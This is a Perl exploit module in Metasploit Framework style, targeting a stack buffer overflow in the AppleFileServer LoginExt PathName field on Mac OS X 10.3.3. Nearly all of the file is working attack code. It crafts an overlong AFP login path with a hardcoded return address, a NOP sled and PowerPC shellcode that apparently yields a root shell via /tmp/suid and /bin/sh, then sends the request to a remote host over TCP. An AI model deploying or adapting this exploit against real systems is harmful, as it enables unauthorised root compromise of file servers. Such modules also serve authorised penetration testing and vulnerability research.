package Msf::Exploit::afp_loginext;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'AppleFileServer LoginExt PathName Buffer Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'bsd' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The AFP port', 548],
                   },
                
    'Payload' => {
                    'Space'      => 512,
                    'BadChars'  => "\x00",
                 },
    
    'Description'  => qq{

    },
    'Refs'  =>  [  
                    'http://www.osvdb.org/5762',
                ],
    'Targets' => [ 
                    ["Mac OS X 10.3.3",   0xf0101c0c],
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];

    my $path = "\xff" x 1024;
    print "Offsets: " . index($path, pack('N', 0x41663641))."\n";
    print "Offsets: " . index($path, pack('N', 0x66334166))."\n";

    my $nop = pack('N', 0x7f7bda78);
    my $trp = pack('N', 0x7fe04008);
    
    $shellcode =
        "\x7c\xa5\x2a\x79\x40\x82\xff\xfd".
        "\x7f\xe8\x02\xa6\x39\x1f\x01\x81".
        "\x39\x08\xfe\xf4\x7c\xa8\x29\xae".
        "\x38\x7f\x01\x78\x38\x63\xfe\xf4".
        "\x38\x80\x02\x01\x38\xa0\xff\xff".
        "\x39\x40\x01\x11\x38\x0a\xfe\xf4".
        "\x44\xff\xff\x02\x60\x60\x60\x60".
        "\x38\x9f\x01\x82\x38\x84\xfe\xf4".
        "\x38\xa0\x01\x18\x38\xa5\xfe\xf4".
        "\x39\x40\x01\x10\x38\x0a\xfe\xf4".
        "\x44\xff\xff\x02\x60\x60\x60\x60".
        "\x39\x40\x01\x12\x38\x0a\xfe\xf4".
        "\x44\xff\xff\x02\x60\x60\x60\x60".
        "\x39\x40\x01\x0d\x38\x0a\xfe\xf4".
        "\x44\xff\xff\x02\x2f\x74\x6d\x70".
        "\x2f\x73\x75\x69\x64\x58\x23\x21".
        "\x2f\x62\x69\x6e\x2f\x73\x68\x0a".
        "\x73\x68";


    # 0xf0101c00
    # 160:  r1 (0xf0203c00)
    # 164:
    # 168:  pc
    
    substr($path, 168,  4, pack('N', $target->[1]));
    substr($path, 172, 100, $nop x 25);
    substr($path, 272, length($shellcode), $shellcode);

    my $afp = "\x3F\x00\x00\x00".
              pack('C',length("AFP3.1"))."AFP3.1".
              pack('C',length("Cleartxt Passwrd"))."Cleartxt Passwrd".
              "\x03".   # user type
              pack('n',length("metasploit"))."metasploit".
              "\x03".   # afp path type
              pack('n',32).$path;
            
    my $req =
        pack('CCnNNN',
                0,                  # Flags
                2,                  # Command
                rand() * 0xffff,    # Request ID
                0,                  # Data Offset
                length($afp),       # Data Length
                0,                  # Reserved
            ).
            $afp;

    my $s = Msf::Socket->new();
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] ". $s->GetError);
        return(0);
    }
    
    $s->Send($req);

    return;
}



